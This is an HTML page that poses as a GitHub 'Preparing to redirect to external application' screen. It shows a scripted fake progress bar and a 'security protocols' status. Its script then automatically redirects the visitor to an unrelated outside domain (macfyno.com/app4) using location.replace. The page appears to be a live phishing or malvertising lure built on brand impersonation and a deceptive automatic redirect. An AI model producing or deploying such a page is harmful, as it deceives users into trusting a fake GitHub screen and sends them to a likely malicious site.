<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Preparing redirect…</title>
<style>
  /* ===== GLOBAL ===== */
  body {
    margin: 0;
    background: #0d1117;
    font-family: system-ui, sans-serif;
    color: #c9d1d9;
    text-align: center;
    padding: 80px 20px;
  }

  .wrapper {
    display: inline-block;
    text-align: center;
  }

  h1 {
    font-size: 2.5em;
    margin-bottom: 10px;
  }

  .subtitle {
    font-size: 1.2em;
    margin-bottom: 40px;
    color: #8b949e;
  }

  .card {
    background: #161b22;
    border-radius: 16px;
    padding: 40px;
    max-width: 480px;
    margin: 0 auto 40px;
  }

  .progress {
    display: flex;
    justify-content: space-between;
    font-size: 16px;
  }

  .bar {
    background: #21262d;
    height: 12px;
    border-radius: 6px;
    margin: 15px 0 30px;
    overflow: hidden;
  }

  .bar-fill {
    background: #2ea043;
    width: 19%;
    height: 100%;
    transition: width 0.5s;
  }

  .status {
    font-size: 16px;
    margin-bottom: 30px;
  }

  .dot {
    display: inline-block;
    width: 12px;
    height: 12px;
    background: #2ea043;
    border-radius: 50%;
    margin-right: 8px;
    animation: blink 1.2s infinite;
  }

  @keyframes blink {
    50% { opacity: 0.3; }
  }

  .branch {
    background: #238636;
    border: none;
    color: white;
    padding: 10px 18px;
    border-radius: 8px;
    font-size: 16px;
    cursor: pointer;
    margin-bottom: 30px;
  }

  .grid {
    display: grid;
    grid-template-columns: repeat(10, 18px);
    gap: 8px;
    justify-content: center;
  }

  .cell {
    width: 18px;
    height: 18px;
    background: #21262d;
    border-radius: 4px;
  }

  .cell.active {
    background: #2ea043;
  }

  .footer {
    color: #8b949e;
    font-size: 1em;
  }
</style>
</head>
<body>
<div class="wrapper">
  <h1>GitHub</h1>
  <p class="subtitle">Preparing to redirect to external application</p>

  <div class="card">
    <div class="progress">
      <span>Processing request</span>
      <span id="percent">19%</span>
    </div>

    <div class="bar">
      <div class="bar-fill" id="bar"></div>
    </div>

    <div class="status">
      <span class="dot"></span>
      Initializing security protocols
    </div>

    <button class="branch">main → external-app</button>

    <div class="grid" id="grid"></div>
  </div>

  <p class="footer">You will be redirected shortly</p>
</div>

<script>
  history.replaceState(null, "", location.href);

  const grid = document.getElementById("grid");
  const bar = document.getElementById("bar");
  const percent = document.getElementById("percent");

  // ===== GRID =====
  for (let i = 0; i < 70; i++) {
    const cell = document.createElement("div");
    cell.className = "cell";
    grid.appendChild(cell);
  }

  setInterval(() => {
    document.querySelectorAll(".cell").forEach(c => {
      c.classList.toggle("active", Math.random() > 0.85);
    });
  }, 500);

  // ===== PROGRESS =====
  let p = 19;

  function animateProgress() {
    let speed;

    if (p < 10) {
      speed = 0.25;
    } else if (p < 55) {
      speed = 0.9;
    } else if (p < 80) {
      speed = 0.18;
    } else if (p < 92) {
      speed = 1.4;
    } else {
      speed = 0.35;
    }

    p += speed;

    if (p >= 100) {
      p = 100;
      bar.style.width = "100%";
      percent.textContent = "100%";

      setTimeout(() => {
        window.location.replace("https://macfyno.com/app4");
      }, 400);

      return;
    }

    bar.style.width = p + "%";
    percent.textContent = Math.floor(p) + "%";

    requestAnimationFrame(animateProgress);
  }

  requestAnimationFrame(animateProgress);
</script>
</body>
</html>
